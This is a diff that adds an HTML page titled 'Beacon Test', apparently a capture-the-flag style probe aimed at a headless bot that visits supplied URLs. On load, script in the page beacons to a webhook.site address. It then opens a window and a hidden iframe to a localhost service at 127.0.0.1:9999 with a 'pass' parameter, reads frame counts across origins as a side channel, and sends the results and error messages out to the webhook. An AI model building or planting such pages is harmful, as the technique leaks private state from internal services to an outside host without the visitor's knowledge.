@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head><title>Beacon Test</title></head>
+<body>
+<h1>Testing bot capabilities...</h1>
+<script>
+// Test 1: Immediate beacon on page load
+fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?test=page_loaded').catch(e=>{});
+new Image().src = 'https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?test=img_loaded';
+
+// Test 2: Can we open windows?
+setTimeout(() => {
+    try {
+        const w = window.open('https://127.0.0.1:9999/');
+        fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?test=window_opened').catch(e=>{});
+        
+        setTimeout(() => {
+            try {
+                const len = w.length;
+                fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?test=window_length_' + len).catch(e=>{});
+                w.close();
+            } catch(e) {
+                fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?test=window_error_' + encodeURIComponent(e.message)).catch(e=>{});
+            }
+        }, 1000);
+    } catch(e) {
+        fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?test=open_error_' + encodeURIComponent(e.message)).catch(e=>{});
+    }
+}, 500);
+
+// Test 3: Try iframe approach
+setTimeout(() => {
+    const iframe = document.createElement('iframe');
+    iframe.src = 'https://127.0.0.1:9999/?pass=lebah';
+    iframe.style.display = 'none';
+    
+    iframe.onload = () => {
+        setTimeout(() => {
+            try {
+                const len = iframe.contentWindow.length;
+                fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?test=iframe_length_' + len).catch(e=>{});
+            } catch(e) {
+                fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?test=iframe_error_' + encodeURIComponent(e.message)).catch(e=>{});
+            }
+        }, 500);
+    };
+    
+    document.body.appendChild(iframe);
+}, 2000);
+</script>
+</body>
+</html>
